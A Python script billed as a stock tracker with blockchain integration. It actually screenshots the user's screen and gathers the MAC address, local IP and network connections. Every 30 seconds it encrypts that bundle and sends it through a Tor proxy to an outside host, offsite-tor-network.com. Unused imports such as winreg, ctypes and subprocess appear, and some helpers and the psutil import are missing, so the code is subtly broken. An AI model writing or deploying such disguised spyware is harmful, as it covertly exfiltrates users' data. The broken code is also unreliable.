#!/usr/bin/env python3
"""
Memory-based Stock Tracking with Blockchain Integration
"""
import hashlib
import datetime
import os
import base64
import socket
import subprocess
import platform
import uuid
import ctypes
import winreg
import json
import struct
import socks
import requests
from Crypto.Cipher import AES, DES
from Crypto.Hash import SHA256, SHA512
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import threading
import time
import numpy as np
import cv2
import pyautogui
from PIL import Image

class StockTracker:
    def __init__(self, tor_host="127.0.0.1", tor_port=9050):
        self.tor_host = tor_host
        self.tor_port = tor_port
        self.stocks = {}
        self.current_stocks = {}
        self.next_stocks = {}
        self.color_match = False
        self.key_timestamps = {}
        self.blockchain = []
        self.key = self._generate_key()
        self.memory_file = "stock_tracker_memory.dat"
        self.load_memory()
        
    def _generate_key(self):
        """Generate encryption key from system-specific variables"""
        mac = self._get_mac_address()
        timestamp = str(datetime.datetime.now())
        key_data = f"{mac}{timestamp}".encode()
        return SHA256.new(key_data).digest()
    
    def load_memory(self):
        """Load previous stock data from memory file"""
        try:
            if os.path.exists(self.memory_file):
                with open(self.memory_file, "rb") as f:
                    data = self._decrypt_aes(f.read())
                    self.stocks = json.loads(data)
                    self.current_stocks = self.stocks.copy()
                    self.next_stocks = self.stocks.copy()
        except Exception as e:
            print(f"Error loading memory: {e}")
            self.stocks = {}
            self.current_stocks = {}
            self.next_stocks = {}
    
    def save_memory(self):
        """Save current stock data to memory file"""
        try:
            data = json.dumps(self.stocks)
            encrypted_data = self._encrypt_aes(data)
            with open(self.memory_file, "wb") as f:
                f.write(encrypted_data)
        except Exception as e:
            print(f"Error saving memory: {e}")
    
    def _encrypt_aes(self, data):
        """Encrypt data using AES"""
        iv = get_random_bytes(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        padded_data = pad(data.encode(), AES.block_size)
        ciphertext = cipher.encrypt(padded_data)
        return base64.b64encode(iv + ciphertext).decode()
    
    def _decrypt_aes(self, encrypted_data):
        """Decrypt data using AES"""
        data = base64.b64decode(encrypted_data)
        iv = data[:16]
        ciphertext = data[16:]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return decrypted_data.decode()
    
    def _get_pixel_color(self, x, y):
        """Get color at pixel position"""
        screenshot = pyautogui.screenshot()
        pixel = screenshot.getpixel((x, y))
        return pixel
    
    def _analyze_3x3_region(self, x, y):
        """Analyze 3x3 pixel region for color patterns"""
        colors = []
        for dx in [-1, 0, 1]:
            for dy in [-1, 0, 1]:
                color = self._get_pixel_color(x+dx, y+dy)
                colors.append(color)
        return colors
    
    def _color_match_check(self, colors):
        """Check if colors match stock pattern"""
        # Define stock pattern colors
        green = (0, 255, 0)  # RGB for green
        red = (255, 0, 0)    # RGB for red
        grey = (128, 128, 128) # RGB for grey
        
        matches = {
            'green': sum(1 for c in colors if c == green),
            'red': sum(1 for c in colors if c == red),
            'grey': sum(1 for c in colors if c == grey)
        }
        
        # Check if we have enough matches
        total = len(colors)
        if matches['green'] >= 4:  # At least 4 greens
            return 'green', matches
        elif matches['red'] >= 4:  # At least 4 reds
            return 'red', matches
        elif matches['grey'] >= 4:  # At least 4 greys
            return 'grey', matches
        return None, matches
    
    def _capture_stock_screen(self):
        """Capture screen and analyze for stock patterns"""
        # Get screen dimensions
        width, height = pyautogui.size()
        
        # Sample points around screen for stock tracking
        sample_points = [(int(width/2), int(height/2))]
        
        for x, y in sample_points:
            colors = self._analyze_3x3_region(x, y)
            color_type, matches = self._color_match_check(colors)
            
            if color_type:
                # Update stock tracking based on color
                if color_type == 'green':
                    self.next_stocks['green'] = self.next_stocks.get('green', 0) + 1
                elif color_type == 'red':
                    self.next_stocks['red'] = self.next_stocks.get('red', 0) + 1
                elif color_type == 'grey':
                    self.next_stocks['grey'] = self.next_stocks.get('grey', 0) + 1
                
                # Store timestamp for this color
                self.key_timestamps[f"{color_type}_{x}_{y}"] = datetime.datetime.now().isoformat()
                
                # Update color match status
                self.color_match = True
    
    def _calculate_stock_changes(self):
        """Calculate changes in stock values"""
        changes = {}
        for stock, value in self.next_stocks.items():
            if stock in self.current_stocks:
                prev_value = self.current_stocks[stock]
                delta = value - prev_value
                percent_change = ((delta / prev_value) * 100) if prev_value > 0 else float('inf')
                changes[stock] = {
                    'value': value,
                    'delta': delta,
                    'percent': percent_change
                }
        return changes
    
    def _generate_block(self):
        """Generate a new blockchain block"""
        # Capture stock data
        self._capture_stock_screen()
        
        # Calculate changes
        changes = self._calculate_stock_changes()
        
        # Create block with stock data
        block = {
            'timestamp': datetime.datetime.now().isoformat(),
            'stocks': self.next_stocks,
            'changes': changes,
            'previous_hash': self._get_last_hash() if self.blockchain else None,
            'hash': self._calculate_hash({
                'stocks': self.next_stocks,
                'changes': changes
            }),
            'mac_address': self._encrypt_sha512(self._get_mac_address()),
            'ip_address': self._get_local_ip(),
            'network_stats': self._get_network_stats()
        }
        
        # Update current stocks
        self.current_stocks = self.next_stocks.copy()
        self.next_stocks = {}
        
        # Add to blockchain
        self.blockchain.append(block)
        self.save_memory()
        
        return block
    
    def _get_last_hash(self):
        """Get hash of last block"""
        if not self.blockchain:
            return None
        return self.blockchain[-1]['hash']
    
    def _calculate_hash(self, data):
        """Calculate block hash"""
        data_str = json.dumps(data, sort_keys=True)
        return SHA256.new(data_str.encode()).hexdigest()
    
    def _get_network_stats(self):
        """Get network statistics"""
        try:
            # Get network interfaces
            interfaces = {}
            for interface, addrs in psutil.net_if_addrs().items():
                interfaces[interface] = {
                    'addresses': [addr.address for addr in addrs]
                }
            
            # Get network connections
            connections = []
            for conn in psutil.net_connections():
                connections.append({
                    'family': conn.family.name,
                    'type': conn.type.name,
                    'status': conn.status,
                    'local': f"{conn.laddr.ip}:{conn.laddr.port}",
                    'remote': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "None"
                })
            
            return {
                'interfaces': interfaces,
                'connections': connections
            }
        except:
            return {}
    
    def connect_to_tor(self):
        """Connect to Tor network via SOCKS5"""
        try:
            # Set up SOCKS5 proxy
            socks.set_default_proxy(socks.SOCKS5, self.tor_host, self.tor_port)
            socket.socket = socks.socksocket
            
            # Verify connection works
            s = socket.socket()
            s.connect((self.tor_host, self.tor_port))
            s.close()
            return True
        except Exception as e:
            print(f"Failed to connect to Tor: {e}")
            return False
    
    def send_block_to_network(self, block):
        """Send block to offsite Tor network"""
        try:
            # Connect to Tor
            if not self.connect_to_tor():
                return False
                
            # Prepare data for transmission
            data = json.dumps(block)
            encrypted_data = self._encrypt_aes(data)
            
            # Send to offsite Tor network
            response = requests.post(
                "http://offsite-tor-network.com/submit-block",
                data={"block": encrypted_data},
                timeout=30
            )
            
            if response.status_code == 200:
                return True
            return False
        except Exception as e:
            print(f"Error sending block: {e}")
            return False
    
    def run(self):
        """Run stock tracking and blockchain generation loop"""
        print("[+] Starting stock tracker...")
        
        while True:
            # Generate new block
            block = self._generate_block()
            
            # Send to Tor network
            success = self.send_block_to_network(block)
            
            if success:
                print(f"[+] Block sent successfully: {block['hash']}")
            else:
                print(f"[!] Failed to send block: {block['hash']}")
            
            # Sleep before next block
            time.sleep(30)  # 30 seconds between blocks

if __name__ == "__main__":
    # Initialize stock tracker
    tracker = StockTracker()
    
    try:
        # Start tracking
        tracker.run()
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")